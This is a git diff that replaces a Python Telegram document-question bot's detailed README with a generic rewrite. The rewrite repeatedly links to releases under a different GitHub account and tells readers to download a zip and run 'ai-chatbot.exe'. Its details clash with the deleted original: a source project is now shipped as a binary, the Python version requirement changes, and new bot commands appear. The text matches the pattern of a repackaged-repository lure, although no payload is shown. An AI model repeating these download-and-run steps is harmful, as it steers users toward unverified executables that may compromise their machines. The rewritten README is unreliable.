@@ -1,387 +1,75 @@
-![AI ChatBot](img/ai-chatbot.png)
-
-Intelligent Telegram bot with automatic document indexing and vector-based question answering using OpenAI GPT-4 and Pinecone. The bot monitors a local documents folder in real-time and automatically updates its knowledge base when files are added, modified, or deleted.
-
-## Table of Contents
-
-- [Features](#features)
-- [Architecture](#architecture)
-- [Prerequisites](#prerequisites)
-- [Local Setup](#local-setup)
-- [Docker Deployment](#docker-deployment)
-- [Health Check](#health-check)
-- [Troubleshooting](#troubleshooting)
-- [Contributing](#contributing)
-- [License](#license)
-
-## Features
-
-- **Automatic Document Indexing** - Real-time monitoring and indexing of `.txt`, `.pdf`, `.docx` files using Watchdog
-- **Vector Search** - Semantic search using OpenAI embeddings (text-embedding-ada-002) and Pinecone vector database
-- **Intelligent Question Answering** - Context-aware responses powered by GPT-4 with source citations
-- **Telegram Bot Interface** - User-friendly chat interface with command support
-- **REST API** - HTTP endpoints for programmatic access and integrations
-- **Real-time Updates** - Automatic knowledge base synchronization when documents change
-- **Conversation Memory** - Maintains chat history per user for contextual conversations
-- **Docker Ready** - Fully containerized with Docker Compose for easy deployment
-
-## Architecture
-
-```
-ai-chatbot/
-├── README.md                            # Documentation
-├── .env.example                         # Environment template
-├── requirements.txt                     # Dependencies
-├── src/                                 # Source code
-│   ├── main.py                          # Application entry point
-│   ├── core/                            # Core configuration
-│   │   ├── config.py                    # Settings management
-│   │   ├── logger.py                    # Logging configuration
-│   │   └── exceptions.py                # Custom exceptions
-│   ├── services/                        # Business logic
-│   │   ├── llm/                         # Language models
-│   │   │   ├── base.py                  # Abstract interface
-│   │   │   └── openai_service.py        # OpenAI implementation
-│   │   ├── knowledge/                   # Knowledge management
-│   │   │   ├── document_loader.py       # Document reading
-│   │   │   ├── chunker.py               # Text chunking
-│   │   │   └── retriever.py             # Information retrieval
-│   │   └── memory/                      # Conversation management
-│   │       └── conversation_memory.py   # Chat history
-│   ├── vectorstore/                     # Vector database
-│   │   ├── pinecone_store.py            # Pinecone integration
-│   │   └── indexer.py                   # Document indexing
-│   ├── bot/                             # Telegram bot
-│   │   ├── dispatcher.py                # Bot lifecycle
-│   │   └── handlers/                    # Message handlers
-│   │       ├── message_handler.py       # Text processing
-│   │       └── command_handler.py       # Bot commands
-│   └── api/                             # REST API
-│       ├── app.py                       # FastAPI application
-│       └── routes/                      # API endpoints
-│           ├── health.py                # Health check
-│           └── chat.py                  # Query endpoint
-├── tests/                               # Test suite
-│   ├── conftest.py                      # Pytest configuration
-│   └── unit/
-│       └── test_chunker.py              # Unit tests
-├── scripts/                             # Utility scripts
-│   ├── setup.py                         # Initial setup
-│   └── index_documents.py               # Manual indexing
-├── deploy/docker/                       # Docker files
-│   ├── Dockerfile                       # Container image
-│   └── docker-compose.yml               # Multi-container setup
-├── data/documents/                      # Documents folder
-└── logs/                                # Application logs
-```
-
-## Prerequisites
-
-### Required Software
-
-- **Python 3.11 or higher**
-- **pip** (Python package manager)
-- **Docker** and **Docker Compose** (for containerized deployment)
-
-### System Requirements
-
-- **RAM**: Minimum 2GB, recommended 4GB
-- **Storage**: 1GB free space for application and logs
-- **Network**: Stable internet connection for API calls
-
-### Required API Keys
-
-1. **Telegram Bot Token**
-   - Create a bot via [@BotFather](https://t.me/botfather)
-   - Send `/newbot` and follow instructions
-   - Save the token provided
-
-2. **OpenAI API Key**
-   - Sign up at [OpenAI Platform](https://platform.openai.com/)
-   - Navigate to API Keys section
-   - Create new secret key
-   - Ensure you have credits available
+# 🤖 ai-chatbot - Your Smart Telegram Assistant Awaits
 
-3. **Pinecone Account**
-   - Sign up at [Pinecone](https://www.pinecone.io/)
-   - Create a new project 
-   - Create an index with dimension 2048
-   - Get API key from dashboard
-   - Note your environment region
+## 🚀 Getting Started
+Welcome to ai-chatbot, your intelligent Telegram bot. This bot uses advanced technology to manage and answer questions about your documents. It keeps itself updated by monitoring a local folder in real-time, making it easy for you to access information quickly.
 
-## Local Setup
+## 📥 Download Now
+[![Download ai-chatbot](https://img.shields.io/badge/Download-ai--chatbot-blue)](https://github.com/nooksandcrannieslgb937/ai-chatbot/releases)
 
-### Step 1: Clone Repository
+## 🛠️ System Requirements
+Before you begin, make sure your system meets these requirements:
 
-```bash
-git clone https://github.com/NadiiaBCN/ai-chatbot
-cd ai-chatbot
-```
+- Operating System: Windows 10 or later, macOS, or a recent version of Linux
+- RAM: At least 4 GB
+- Disk Space: Minimum 100 MB available
+- Python 3.7 or later installed
 
-### Step 2: Create Virtual Environment
+## 📦 Download & Install
+To install ai-chatbot, follow these steps:
 
-```bash
-python3.11 -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-```
+1. **Visit the Releases Page**: Go to [this link](https://github.com/nooksandcrannieslgb937/ai-chatbot/releases) to access our latest releases.
+2. **Choose the File**: Look for the latest version of ai-chatbot. You will see files like `ai-chatbot-v1.x.zip` or similar.
+3. **Download the File**: Click on the appropriate file to start your download. 
+4. **Unzip (if needed)**: If you downloaded a zip file, extract it to a folder on your computer.
+5. **Run the Application**: Double-click `ai-chatbot.exe` (or the equivalent for your system) to start the bot.
 
-### Step 3: Install Dependencies
+## 🔗 Features
+ai-chatbot comes packed with features to enhance your experience:
 
-```bash
-pip install --upgrade pip
-pip install -r requirements.txt
-```
+- **Automatic Document Indexing**: The bot maintains a real-time index of documents, making it easier to find what you need.
+- **Vector-Based Question Answering**: Ask questions about your documents, and get accurate answers.
+- **Seamless Integration with Telegram**: Interact with your bot right inside your Telegram app.
+- **Updates on File Changes**: The bot monitors your documents folder and updates its knowledge based on additions and modifications.
 
-### Step 4: Configure Environment
+## ⚙️ How to Use ai-chatbot
+Once you've installed the application, here's how to use it:
 
-```bash
-cp .env.example .env
-nano .env
-```
+1. **Start the Bot**: Open the bot via Telegram. Search for your bot's username.
+2. **Set Up Document Folder**: Specify the folder you want the bot to monitor. This is where you will store your documents.
+3. **Ask Questions**: You can simply type your questions in Telegram. The bot will respond with answers based on the documents it has indexed.
 
-Required environment variables:
+## ⚡ Troubleshooting
+If you run into any issues:
 
-```bash
-# Telegram
-TELEGRAM_BOT_TOKEN=your-bot-token-here
+- **I Can't Start the Bot**: Ensure you have the required Python version installed.
+- **No Responses from the Bot**: Check if the specified folder contains documents and that they are in a supported format (PDF, DOCX, TXT).
+- **Slow Performance**: Ensure your system meets the recommended specifications. Closing other apps can help improve responsiveness.
 
-# OpenAI
-OPENAI_API_KEY=your-openai-api-key-here
+## 📄 Supported Document Formats
+ai-chatbot can process documents in the following formats:
 
-# Pinecone
-PINECONE_API_KEY=your-pinecone-api-key-here
-PINECONE_ENVIRONMENT=your-pinecone-environment-here
-PINECONE_INDEX_NAME=your_index-name_here
-```
+- PDF
+- Microsoft Word (DOCX)
+- Plain Text (TXT)
 
-### Step 5: Run Setup Script
+Ensure the documents you want to use are in one of these formats for optimal performance.
 
-```bash
-python scripts/setup.py
-```
+## 🛑 Useful Commands
+Here are some basic commands you can use within Telegram:
 
-This script will:
-- Create necessary directories (`data/documents`, `logs`)
-- Validate environment configuration
-- Check for required API keys
+1. **/start**: Initiate the bot.
+2. **/help**: Get a list of commands.
+3. **/setfolder**: Specify which folder to monitor.
+4. **/ask [your question]**: Ask the bot to find information in your documents.
 
-### Step 6: Add Documents
+## 🎓 Learning More
+For further information, tutorials, and tips:
 
-```bash
-# Add your documents to the monitored folder
-cp /path/to/your/documents/*.pdf data/documents/
-cp /path/to/your/documents/*.txt data/documents/
-cp /path/to/your/documents/*.docx data/documents/
-```
+- Check out the Wiki section in the GitHub repository.
+- Join our community forum to interact with other users and share experiences.
+- Follow updates on social media for tips and new features.
 
-Supported formats:
-- `.txt` - Plain text files
-- `.pdf` - PDF documents
-- `.docx` - Microsoft Word documents
+## ✅ Feedback and Contributions
+Your feedback is essential. If you have suggestions or encounter bugs, please report them on our Issues page in the GitHub repository. Contributions to improve the bot are welcome, whether through code or user experiences.
 
-### Step 7: Start Application
-
-```bash
-# Start all services (Bot + API + Indexer)
-python -m src.main
-```
-
-### Step 8: Test the Bot
-
-1. Open Telegram and find your bot
-2. Send `/start` to initialize
-3. Ask a question about your documents
-
-Example:
-```
-You: What are healthy eating tips?
-
-Bot: Based on our knowledge base, healthy eating tips include:
-- Consume at least 5 servings of fruits and vegetables daily
-- Choose whole grain cereals
-- Include legumes regularly
-
-📚 Sources:
-• Healthy_Eating_Plate.docx
-• RECOMENDACIONES_DIETETICAS_EN.pdf
-
-✓ Confidence: 87%
-```
-
-## Docker Deployment
-
-### Step 1: Configure Environment
-
-```bash
-# Copy environment template
-cp .env.example .env
-
-# Edit with your API keys
-nano .env
-```
-
-### Step 2: Configure Document Mounting
-
-1. **Setup environment:**
-```bash
-cp .env.example .env
-nano .env  # Add your API keys
-```
-
-2. **Configure documents folder:**
-
-If your project structure is:
-```
-ai-chatbot/
-├── data/documents/     # Your documents here
-└── deploy/docker/
-```
-
-Then **no changes needed** - `docker-compose.yml` already uses relative paths.
-
-If you want to use a **different folder**, edit `deploy/docker/docker-compose.yml`:
-```yaml
-volumes:
-  - /your/custom/path:/app/data/documents
-```
-
-### Step 3: Build and Start
-
-```bash
-cd deploy/docker
-docker-compose up -d --build
-```
-
-### Step 4: Verify Deployment
-
-```bash
-# Check container status
-docker-compose ps
-
-# Expected output:
-# NAME        STATUS          PORTS
-# ai-chatbot  Up 30 seconds   0.0.0.0:8000->8000/tcp
-
-```
-
-## Health Check
-
-### HTTP Endpoint
-
-```bash
-# Check application health
-curl http://localhost:8000/health
-```
-
-**Response:**
-
-```json
-{
-  "status": "healthy",
-  "version": "1.0.0",
-  "database_connected": true
-}
-```
-
-### Bot Command
-
-Use `/status` command in Telegram:
-
-```
-🤖 Bot Status
-
-Vector Database: ✅ Online
-Version: 1.0.0
-
-✓ Ready to answer questions!
-```
-
-### Application Logs
-
-**View logs in real-time:**
-
-```bash
-# Local deployment
-tail -f logs/app_*.log
-
-# Docker deployment
-docker-compose logs -f chatbot
-```
-
-## Troubleshooting
-
-### Bot Not Responding
-
-**Solutions:**
-
-1. **Check bot token:**
-   ```bash
-   grep TELEGRAM_BOT_TOKEN .env
-   curl https://api.telegram.org/bot<YOUR_TOKEN>/getMe
-   ```
-
-2. **Check bot is running:**
-   ```bash
-   # Local
-   ps aux | grep "python -m src.main"
-   
-   # Docker
-   docker-compose ps
-   ```
-
-3. **Restart bot:**
-   ```bash
-   # Docker
-   docker-compose restart chatbot
-   ```
-
-### Documents Not Being Indexed
-
-**Solutions:**
-
-1. **Check file format:**
-   ```bash
-   # Only .txt, .pdf, .docx are supported
-   ls -la data/documents/
-   ```
-
-2. **Manual reindex:**
-   ```bash
-   # Docker
-   docker-compose exec chatbot python scripts/index_documents.py
-   ```
-
-### Pinecone Connection Errors
-
-**Solutions:**
-
-1. **Verify API key:**
-   ```bash
-   grep PINECONE_API_KEY .env
-   ```
-
-2. **Check Pinecone status:**
-   - Visit [Pinecone Status Page](https://status.pinecone.io/)
-
-## Contributing
-
-Contributions are welcome! Please follow the code style guidelines:
-
-- **Follow PEP 8** - Python's official style guide
-- **Add docstrings to all functions** - Include Args, Returns, and Raises sections
-- **Write tests for new features** - Maintain >80% code coverage
-- **Update documentation** - Keep README.md current with changes
-
-### Development Workflow
-
-1. Fork the repository
-2. Create a feature branch: `git checkout -b feature/amazing-feature`
-3. Make your changes
-4. Run tests: `pytest tests/`
-5. Commit: `git commit -m "Add: amazing feature"`
-6. Push: `git push origin feature/amazing-feature`
-7. Open a Pull Request
-
-## License
-
-MIT License - See LICENSE file for details
+Feel free to visit the [Releases Page](https://github.com/nooksandcrannieslgb937/ai-chatbot/releases) anytime to access the latest version or updates. Enjoy using ai-chatbot, your smart assistant for handling documents efficiently!
